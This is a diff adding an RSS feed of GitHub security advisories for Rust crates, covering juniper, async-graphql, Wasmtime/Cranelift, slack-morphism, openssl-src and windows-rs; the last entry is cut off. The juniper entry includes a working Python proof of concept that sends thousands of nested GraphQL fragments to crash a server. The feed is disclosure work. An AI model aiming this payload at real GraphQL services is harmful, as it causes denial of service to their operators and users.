@@ -1,0 +1,771 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
+    <title>Security Advisory for Rust crates</title>
+    <updated>2022-08-03T08:56:20.856Z</updated>
+    <generator>github-advisory-database-rss</generator>
+    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
+    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
+    <rights>github-advisory-database-rss</rights>
+    <category term="CRITICAL"/>
+    <category term="HIGH"/>
+    <category term="MODERATE"/>
+    <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[juniper] Juniper is vulnerable to @DOS GraphQL Nested Fragments overflow]]></title>
+        <id>https://github.com/advisories/GHSA-4rx6-g5vg-5f3j</id>
+        <link href="https://github.com/advisories/GHSA-4rx6-g5vg-5f3j"/>
+        <updated>2022-07-29T22:29:23.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="graphql-behaviour">GraphQL behaviour</h3>
+<p>Nested fragment in GraphQL might be quite hard to handle depending on the implementation language.
+Some language support natively a max recursion depth. However, on most compiled languages, you should add a threshold of recursion.</p>
+<pre><code class="language-graphql"># Infinite loop example
+query {
+    ...a
+}
+
+fragment a on Query {
+    ...b
+}
+
+fragment b on Query {
+    ...a
+}
+</code></pre>
+<h3 id="poc-tldr">POC TLDR</h3>
+<p>With max_size being the number of nested fragment generated.
+At max_size=7500, it should instantly raise:</p>
+<p><img alt="" src="https://i.imgur.com/wXbUx8l.png"></p>
+<p>However, with a lower size, you will overflow the memory after some iterations.</p>
+<h3 id="reproduction-steps-juniper">Reproduction steps (Juniper)</h3>
+<pre><code>git clone https://github.com/graphql-rust/juniper.git
+cd juniper
+</code></pre>
+<p>Save this POC as poc.py</p>
+<pre><code class="language-python">import requests
+import time
+import json
+from itertools import permutations
+
+print('=== Fragments POC ===')
+
+url = 'http://localhost:8080/graphql'
+
+max_size = 7500
+perms = [''.join(p) for p in permutations('abcefghijk')]
+perms = perms[:max_size]
+
+fragment_payloads = ''
+for i, perm in enumerate(perms):
+    next_perm = perms[i+1] if i &lt; max_size-1 else perms[0]
+    fragment_payloads += f'fragment {perm} on Query' + '{' f'...{next_perm}' + '}'
+
+payload = {'query':'query{\n  ...' + perms[0] + '\n}' + fragment_payloads,'variables':{},'operationName':None}
+
+headers = {
+  'Content-Type': 'application/json',
+}
+
+try:
+    response = requests.request('POST', url, headers=headers, json=payload)
+    print(response.text)
+except requests.exceptions.ConnectionError:
+    print('Connection closed, POC worked.')
+</code></pre>
+<pre><code>cargo run
+[in separate shell] python3 poc.py
+</code></pre>
+<h3 id="credits">Credits</h3>
+<p><a href="https://escape.tech">@Escape-Technologies</a></p>
+<p>@c3b5aw 
+@MdotTIM 
+@karimhreda </p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/graphql-rust/juniper/security/advisories/GHSA-4rx6-g5vg-5f3j">https://github.com/graphql-rust/juniper/security/advisories/GHSA-4rx6-g5vg-5f3j</a></li>
+<li><a href="https://github.com/graphql-rust/juniper/commit/2b609ee057be950e3454b69fadc431d120e407bb">https://github.com/graphql-rust/juniper/commit/2b609ee057be950e3454b69fadc431d120e407bb</a></li>
+<li><a href="https://github.com/graphql-rust/juniper/commit/8d28cdba6eb10f53490ba41d1b5cb40506c2de22">https://github.com/graphql-rust/juniper/commit/8d28cdba6eb10f53490ba41d1b5cb40506c2de22</a></li>
+<li><a href="https://github.com/graphql-rust/juniper/blob/juniper-v0.15.10/juniper/CHANGELOG.md#01510-2022-07-28">https://github.com/graphql-rust/juniper/blob/juniper-v0.15.10/juniper/CHANGELOG.md#01510-2022-07-28</a></li>
+<li><a href="https://github.com/advisories/GHSA-4rx6-g5vg-5f3j">https://github.com/advisories/GHSA-4rx6-g5vg-5f3j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4rx6-g5vg-5f3j</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2022-07-29T22:29:22.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[async-graphql] async-graphql / async-graphql - @DOS GraphQL Nested Fragments overflow]]></title>
+        <id>https://github.com/advisories/GHSA-xq3c-8gqm-v648</id>
+        <link href="https://github.com/advisories/GHSA-xq3c-8gqm-v648"/>
+        <updated>2022-07-29T22:22:27.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Executing deeply nested queries may cause stack overflow.</p>
+<h3 id="patches">Patches</h3>
+<p>Upgrade to <code>v4.0.6</code></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/async-graphql/async-graphql/security/advisories/GHSA-xq3c-8gqm-v648">https://github.com/async-graphql/async-graphql/security/advisories/GHSA-xq3c-8gqm-v648</a></li>
+<li><a href="https://github.com/async-graphql/async-graphql/commit/521769b80039fc8043d1c9883e3d6e5b57359072">https://github.com/async-graphql/async-graphql/commit/521769b80039fc8043d1c9883e3d6e5b57359072</a></li>
+<li><a href="https://github.com/advisories/GHSA-xq3c-8gqm-v648">https://github.com/advisories/GHSA-xq3c-8gqm-v648</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xq3c-8gqm-v648</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2022-07-29T22:22:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[cranelift-codegen] Cranelift vulnerable to miscompilation of constant values in division on AArch64]]></title>
+        <id>https://github.com/advisories/GHSA-7f6x-jwh5-m9r4</id>
+        <link href="https://github.com/advisories/GHSA-7f6x-jwh5-m9r4"/>
+        <updated>2022-07-25T19:26:29.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>There was a bug in Wasmtime's code generator, Cranelift, for AArch64 targets where constant divisors could result in incorrect division results at runtime. The translation rules for constants did not take into account whether sign- or zero-extension should happen, which resulted in an incorrect value being placed into a register when a division was encountered. For example, a constant 32-bit unsigned divisor of <code>0xfffffffe</code> would be incorrectly sign-extended to 64-bits to <code>0xfffffffffffffffe</code>. Any kind of division of operands smaller than 64 bits is implemented with a 64-bit division instruction which would then result in an incorrect result because the divisor was larger than expected.</p>
+<p>The impact of this bug is that programs executing within the WebAssembly sandbox would not behave according to the WebAssembly specification. This means that it is hypothetically possible for execution within the sandbox to go awry and WebAssembly programs could produce unexpected results. This should not impact hosts executing WebAssembly, but does affect the correctness of guest programs.</p>
+<p>This bug was found with differential fuzzing of Wasmtime against other engines on the AArch64 platform. Fuzzing on AArch64 is not regularly performed at this time and the Wasmtime team is investigating how best to continuously fuzz AArch64 in the same manner as x86_64.</p>
+<h3 id="patches">Patches</h3>
+<p>This bug has been patched and users should upgrade to Wasmtime version 0.38.2.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If upgrading is not an option at this time, direct users of Cranelift that control the exact Cranelift instructions being compiled can avoid the vulnerability by explicitly extending constant divisors to 64 bits using either the <code>sextend.i64</code> or the <code>uextend.i64</code> operation.</p>
+<p>Note, though, that this issue only affects the AArch64 targets. Other platforms are not affected.</p>
+<h3 id="for-more-information">For more information</h3>
+<p>If you have any questions or comments about this advisory:</p>
+<ul>
+<li>Reach out to us on <a href="https://bytecodealliance.zulipchat.com/#narrow/stream/217126-wasmtime">the Bytecode Alliance Zulip chat</a></li>
+<li>Open an issue in <a href="https://github.com/bytecodealliance/wasmtime/">the bytecodealliance/wasmtime repository</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-7f6x-jwh5-m9r4">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-7f6x-jwh5-m9r4</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41">https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31169">https://nvd.nist.gov/vuln/detail/CVE-2022-31169</a></li>
+<li><a href="https://github.com/advisories/GHSA-7f6x-jwh5-m9r4">https://github.com/advisories/GHSA-7f6x-jwh5-m9r4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7f6x-jwh5-m9r4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2022-07-21T22:34:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wasmtime] Cranelift vulnerable to miscompilation of constant values in division on AArch64]]></title>
+        <id>https://github.com/advisories/GHSA-7f6x-jwh5-m9r4</id>
+        <link href="https://github.com/advisories/GHSA-7f6x-jwh5-m9r4"/>
+        <updated>2022-07-25T19:26:29.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>There was a bug in Wasmtime's code generator, Cranelift, for AArch64 targets where constant divisors could result in incorrect division results at runtime. The translation rules for constants did not take into account whether sign- or zero-extension should happen, which resulted in an incorrect value being placed into a register when a division was encountered. For example, a constant 32-bit unsigned divisor of <code>0xfffffffe</code> would be incorrectly sign-extended to 64-bits to <code>0xfffffffffffffffe</code>. Any kind of division of operands smaller than 64 bits is implemented with a 64-bit division instruction which would then result in an incorrect result because the divisor was larger than expected.</p>
+<p>The impact of this bug is that programs executing within the WebAssembly sandbox would not behave according to the WebAssembly specification. This means that it is hypothetically possible for execution within the sandbox to go awry and WebAssembly programs could produce unexpected results. This should not impact hosts executing WebAssembly, but does affect the correctness of guest programs.</p>
+<p>This bug was found with differential fuzzing of Wasmtime against other engines on the AArch64 platform. Fuzzing on AArch64 is not regularly performed at this time and the Wasmtime team is investigating how best to continuously fuzz AArch64 in the same manner as x86_64.</p>
+<h3 id="patches">Patches</h3>
+<p>This bug has been patched and users should upgrade to Wasmtime version 0.38.2.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If upgrading is not an option at this time, direct users of Cranelift that control the exact Cranelift instructions being compiled can avoid the vulnerability by explicitly extending constant divisors to 64 bits using either the <code>sextend.i64</code> or the <code>uextend.i64</code> operation.</p>
+<p>Note, though, that this issue only affects the AArch64 targets. Other platforms are not affected.</p>
+<h3 id="for-more-information">For more information</h3>
+<p>If you have any questions or comments about this advisory:</p>
+<ul>
+<li>Reach out to us on <a href="https://bytecodealliance.zulipchat.com/#narrow/stream/217126-wasmtime">the Bytecode Alliance Zulip chat</a></li>
+<li>Open an issue in <a href="https://github.com/bytecodealliance/wasmtime/">the bytecodealliance/wasmtime repository</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-7f6x-jwh5-m9r4">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-7f6x-jwh5-m9r4</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41">https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31169">https://nvd.nist.gov/vuln/detail/CVE-2022-31169</a></li>
+<li><a href="https://github.com/advisories/GHSA-7f6x-jwh5-m9r4">https://github.com/advisories/GHSA-7f6x-jwh5-m9r4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7f6x-jwh5-m9r4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2022-07-21T22:34:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[cranelift-codegen] Wasmtime vulnerable to Use After Free with `externref`s]]></title>
+        <id>https://github.com/advisories/GHSA-5fhj-g3p3-pq9g</id>
+        <link href="https://github.com/advisories/GHSA-5fhj-g3p3-pq9g"/>
+        <updated>2022-07-22T16:34:34.000Z</updated>
+        <content type="html"><![CDATA[<p>There is a bug in Wasmtime's code generator, Cranelift, where functions using reference types may be incorrectly missing metadata required for runtime garbage collection (GC). This means that if a GC happens at runtime then the collector will mistakenly think some Wasm stack frames do not have live references to garbage collected values and therefore reclaim and deallocate them. The function can then subsequently continue to use the values, leading later to use-after-free bugs. This bug was introduced in Cranelift's migration to the <code>regalloc2</code> register allocator in the Wasmtime 0.37.0 release on 2022-05-20. This bug has been patched and users should upgrade to Wasmtime version 0.38.2.</p>
+<p>Mitigations for this issue can be achieved by doing one of:</p>
+<ul>
+<li>Disabling the reference types proposal by passing <code>false</code> to <a href="https://docs.rs/wasmtime/0.38.0/wasmtime/struct.Config.html#method.wasm_reference_types"><code>wasmtime::Config::wasm_reference_types</code></a>.</li>
+<li>Downgrading to Wasmtime 0.36.0 or prior.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-5fhj-g3p3-pq9g">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-5fhj-g3p3-pq9g</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41">https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31146">https://nvd.nist.gov/vuln/detail/CVE-2022-31146</a></li>
+<li><a href="https://github.com/WebAssembly/reference-types">https://github.com/WebAssembly/reference-types</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/">https://github.com/bytecodealliance/wasmtime/</a></li>
+<li><a href="https://github.com/advisories/GHSA-5fhj-g3p3-pq9g">https://github.com/advisories/GHSA-5fhj-g3p3-pq9g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5fhj-g3p3-pq9g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2022-07-20T22:47:13.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wasmtime] Wasmtime vulnerable to Use After Free with `externref`s]]></title>
+        <id>https://github.com/advisories/GHSA-5fhj-g3p3-pq9g</id>
+        <link href="https://github.com/advisories/GHSA-5fhj-g3p3-pq9g"/>
+        <updated>2022-07-22T16:34:34.000Z</updated>
+        <content type="html"><![CDATA[<p>There is a bug in Wasmtime's code generator, Cranelift, where functions using reference types may be incorrectly missing metadata required for runtime garbage collection (GC). This means that if a GC happens at runtime then the collector will mistakenly think some Wasm stack frames do not have live references to garbage collected values and therefore reclaim and deallocate them. The function can then subsequently continue to use the values, leading later to use-after-free bugs. This bug was introduced in Cranelift's migration to the <code>regalloc2</code> register allocator in the Wasmtime 0.37.0 release on 2022-05-20. This bug has been patched and users should upgrade to Wasmtime version 0.38.2.</p>
+<p>Mitigations for this issue can be achieved by doing one of:</p>
+<ul>
+<li>Disabling the reference types proposal by passing <code>false</code> to <a href="https://docs.rs/wasmtime/0.38.0/wasmtime/struct.Config.html#method.wasm_reference_types"><code>wasmtime::Config::wasm_reference_types</code></a>.</li>
+<li>Downgrading to Wasmtime 0.36.0 or prior.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-5fhj-g3p3-pq9g">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-5fhj-g3p3-pq9g</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41">https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31146">https://nvd.nist.gov/vuln/detail/CVE-2022-31146</a></li>
+<li><a href="https://github.com/WebAssembly/reference-types">https://github.com/WebAssembly/reference-types</a></li>
+<li><a href="https://github.com/bytecodealliance/wasmtime/">https://github.com/bytecodealliance/wasmtime/</a></li>
+<li><a href="https://github.com/advisories/GHSA-5fhj-g3p3-pq9g">https://github.com/advisories/GHSA-5fhj-g3p3-pq9g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5fhj-g3p3-pq9g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2022-07-20T22:47:13.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[slack-morphism] Slack Morphism for Rust before 0.41.0 can accidentally leak Slack OAuth client information in application debug logs]]></title>
+        <id>https://github.com/advisories/GHSA-99j7-mhfh-w84p</id>
+        <link href="https://github.com/advisories/GHSA-99j7-mhfh-w84p"/>
+        <updated>2022-07-25T19:32:44.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Potential/accidental leaking of Slack OAuth client information in application debug logs.</p>
+<h3 id="patches">Patches</h3>
+<p>More strict and secure debug formatting was introduced in v0.41 for OAuth secret types to avoid the possibility of printing sensitive information in application logs.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Don't print/output in logs request and responses for OAuth and client configurations.</p>
+<h3 id="for-more-information">For more information</h3>
+<p>If you have any questions or comments about this advisory:</p>
+<ul>
+<li>Open an issue in the <a href="https://github.com/abdolence/slack-morphism-rust">repo</a></li>
+<li>Email us at <a href="mailto:me@abdolence.dev">me@abdolence.dev</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/abdolence/slack-morphism-rust/security/advisories/GHSA-99j7-mhfh-w84p">https://github.com/abdolence/slack-morphism-rust/security/advisories/GHSA-99j7-mhfh-w84p</a></li>
+<li><a href="https://github.com/abdolence/slack-morphism-rust/releases/tag/v0.41.0">https://github.com/abdolence/slack-morphism-rust/releases/tag/v0.41.0</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31162">https://nvd.nist.gov/vuln/detail/CVE-2022-31162</a></li>
+<li><a href="https://github.com/advisories/GHSA-99j7-mhfh-w84p">https://github.com/advisories/GHSA-99j7-mhfh-w84p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-99j7-mhfh-w84p</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2022-07-20T01:30:21.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[openssl-src] openssl-src 300.0.8 heap memory corruption with RSA private key operation]]></title>
+        <id>https://github.com/advisories/GHSA-735f-pg76-fxc4</id>
+        <link href="https://github.com/advisories/GHSA-735f-pg76-fxc4"/>
+        <updated>2022-07-21T16:22:23.000Z</updated>
+        <content type="html"><![CDATA[<p>The OpenSSL 3.0.4 release introduced a serious bug in the RSA implementation for X86_64 CPUs supporting the AVX512IFMA instructions. This issue makes the RSA implementation with 2048 bit private keys incorrect on such machines and memory corruption will happen during the computation. As a consequence of the memory corruption an attacker may be able to trigger a remote code execution on the machine performing the computation. SSL/TLS servers or other servers using 2048 bit RSA private keys running on machines supporting AVX512IFMA instructions of the X86_64 architecture are affected by this issue.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-2274">https://nvd.nist.gov/vuln/detail/CVE-2022-2274</a></li>
+<li><a href="https://github.com/openssl/openssl/issues/18625">https://github.com/openssl/openssl/issues/18625</a></li>
+<li><a href="https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=4d8a88c134df634ba610ff8db1eb8478ac5fd345">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=4d8a88c134df634ba610ff8db1eb8478ac5fd345</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0033.html">https://rustsec.org/advisories/RUSTSEC-2022-0033.html</a></li>
+<li><a href="https://www.openssl.org/news/secadv/20220705.txt">https://www.openssl.org/news/secadv/20220705.txt</a></li>
+<li><a href="https://security.netapp.com/advisory/ntap-20220715-0010/">https://security.netapp.com/advisory/ntap-20220715-0010/</a></li>
+<li><a href="https://github.com/advisories/GHSA-735f-pg76-fxc4">https://github.com/advisories/GHSA-735f-pg76-fxc4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-735f-pg76-fxc4</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2022-07-02T00:00:29.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[openssl-src] AES OCB fails to encrypt some bytes]]></title>
+        <id>https://github.com/advisories/GHSA-3wx7-46ch-7rq2</id>
+        <link href="https://github.com/advisories/GHSA-3wx7-46ch-7rq2"/>
+        <updated>2022-07-25T18:25:40.000Z</updated>
+        <content type="html"><![CDATA[<p>AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised
+implementation will not encrypt the entirety of the data under some
+circumstances.  This could reveal sixteen bytes of data that was
+preexisting in the memory that wasn't written.  In the special case of
+"in place" encryption, sixteen bytes of the plaintext would be revealed.</p>
+<p>Since OpenSSL does not support OCB based cipher suites for TLS and DTLS,
+they are both unaffected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-2097">https://nvd.nist.gov/vuln/detail/CVE-2022-2097</a></li>
+<li><a href="https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=919925673d6c9cfed3c1085497f5dfbbed5fc431">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=919925673d6c9cfed3c1085497f5dfbbed5fc431</a></li>
+<li><a href="https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a98f339ddd7e8f487d6e0088d4a9a42324885a93">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a98f339ddd7e8f487d6e0088d4a9a42324885a93</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0032.html">https://rustsec.org/advisories/RUSTSEC-2022-0032.html</a></li>
+<li><a href="https://www.openssl.org/news/secadv/20220705.txt">https://www.openssl.org/news/secadv/20220705.txt</a></li>
+<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/V6567JERRHHJW2GNGJGKDRNHR7SNPZK7/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/V6567JERRHHJW2GNGJGKDRNHR7SNPZK7/</a></li>
+<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R6CK57NBQFTPUMXAPJURCGXUYT76NQAK/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R6CK57NBQFTPUMXAPJURCGXUYT76NQAK/</a></li>
+<li><a href="https://security.netapp.com/advisory/ntap-20220715-0011/">https://security.netapp.com/advisory/ntap-20220715-0011/</a></li>
+<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VCMNWKERPBKOEBNL7CLTTX3ZZCZLH7XA/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VCMNWKERPBKOEBNL7CLTTX3ZZCZLH7XA/</a></li>
+<li><a href="https://github.com/advisories/GHSA-3wx7-46ch-7rq2">https://github.com/advisories/GHSA-3wx7-46ch-7rq2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3wx7-46ch-7rq2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2022-07-06T19:57:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[openssl-src] AES OCB fails to encrypt some bytes]]></title>
+        <id>https://github.com/advisories/GHSA-3wx7-46ch-7rq2</id>
+        <link href="https://github.com/advisories/GHSA-3wx7-46ch-7rq2"/>
+        <updated>2022-07-25T18:25:40.000Z</updated>
+        <content type="html"><![CDATA[<p>AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised
+implementation will not encrypt the entirety of the data under some
+circumstances.  This could reveal sixteen bytes of data that was
+preexisting in the memory that wasn't written.  In the special case of
+"in place" encryption, sixteen bytes of the plaintext would be revealed.</p>
+<p>Since OpenSSL does not support OCB based cipher suites for TLS and DTLS,
+they are both unaffected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-2097">https://nvd.nist.gov/vuln/detail/CVE-2022-2097</a></li>
+<li><a href="https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=919925673d6c9cfed3c1085497f5dfbbed5fc431">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=919925673d6c9cfed3c1085497f5dfbbed5fc431</a></li>
+<li><a href="https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a98f339ddd7e8f487d6e0088d4a9a42324885a93">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a98f339ddd7e8f487d6e0088d4a9a42324885a93</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0032.html">https://rustsec.org/advisories/RUSTSEC-2022-0032.html</a></li>
+<li><a href="https://www.openssl.org/news/secadv/20220705.txt">https://www.openssl.org/news/secadv/20220705.txt</a></li>
+<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/V6567JERRHHJW2GNGJGKDRNHR7SNPZK7/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/V6567JERRHHJW2GNGJGKDRNHR7SNPZK7/</a></li>
+<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R6CK57NBQFTPUMXAPJURCGXUYT76NQAK/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R6CK57NBQFTPUMXAPJURCGXUYT76NQAK/</a></li>
+<li><a href="https://security.netapp.com/advisory/ntap-20220715-0011/">https://security.netapp.com/advisory/ntap-20220715-0011/</a></li>
+<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VCMNWKERPBKOEBNL7CLTTX3ZZCZLH7XA/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VCMNWKERPBKOEBNL7CLTTX3ZZCZLH7XA/</a></li>
+<li><a href="https://github.com/advisories/GHSA-3wx7-46ch-7rq2">https://github.com/advisories/GHSA-3wx7-46ch-7rq2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3wx7-46ch-7rq2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2022-07-06T19:57:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[windows] Delegate functions are missing `Send` bound]]></title>
+        <id>https://github.com/advisories/GHSA-x4mq-m75f-mx8m</id>
+        <link href="https://github.com/advisories/GHSA-x4mq-m75f-mx8m"/>
+        <updated>2022-07-05T21:26:38.000Z</updated>
+        <content type="html"><![CDATA[<p>Affected versions of this crate did not require event handlers to have <code>Send</code> bound despite there being no guarantee of them being called on any particular thread, which can potentially lead to data races and undefined behavior.</p>
+<p>The flaw was corrected in commit <a href="https://github.com/microsoft/windows-rs/commit/afe32525c22209aa8f632a0f4ad607863b51796a">afe3252</a> by adding <code>Send</code> bounds.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/microsoft/windows-rs/issues/1409">https://github.com/microsoft/windows-rs/issues/1409</a></li>
+<li><a href="https://github.com/microsoft/windows-rs/commit/afe32525c22209aa8f632a0f4ad607863b51796a">https://github.com/microsoft/windows-rs/commit/afe32525c22209aa8f632a0f4ad607863b51796a</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0008.html">https://rustsec.org/advisories/RUSTSEC-2022-0008.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-x4mq-m75f-mx8m">https://github.com/advisories/GHSA-x4mq-m75f-mx8m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-x4mq-m75f-mx8m</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2022-06-17T00:30:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[cranelift-codegen] Miscompilation of `i8x16.swizzle` and `select` with v128 inputs]]></title>
+        <id>https://github.com/advisories/GHSA-jqwc-c49r-4w2x</id>
+        <link href="https://github.com/advisories/GHSA-jqwc-c49r-4w2x"/>
+        <updated>2022-06-29T22:08:26.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Wasmtime's implementation of the <a href="https://github.com/webassembly/simd">SIMD proposal for WebAssembly</a> on x86_64 contained two distinct bugs in the instruction lowerings implemented in Cranelift. The aarch64 implementation of the simd proposal is not affected. The bugs were presented in the <code>i8x16.swizzle</code> and <code>select</code> WebAssembly instructions. The <code>select</code> instruction is only affected when the inputs are of <code>v128</code> type. The correspondingly affected Cranelift instructions were <code>swizzle</code> and <code>select</code>.</p>
